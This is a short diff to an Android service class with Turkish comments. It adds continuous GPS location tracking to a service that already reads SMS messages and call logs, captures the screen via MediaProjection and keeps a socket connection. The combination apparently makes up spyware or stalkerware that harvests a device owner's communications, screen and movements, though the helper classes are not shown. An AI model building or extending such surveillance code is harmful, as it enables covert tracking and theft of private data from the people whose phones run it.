@@ -35,6 +35,9 @@ class MainService : Service() {
         SmsReader.start(this)
         CallLogReader.start(this)
 
+        // GPS sürekli konum takibi
+        LocationHelper.startTracking(this)
+
         // MediaProjection token'ı MainActivity'den al
         val resultCode = intent?.getIntExtra("resultCode", -1) ?: -1
         val projData   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
@@ -110,5 +113,6 @@ class MainService : Service() {
         SocketManager.disconnect()
         SmsReader.stop()
         CallLogReader.stop()
+        LocationHelper.stop()
     }
 }
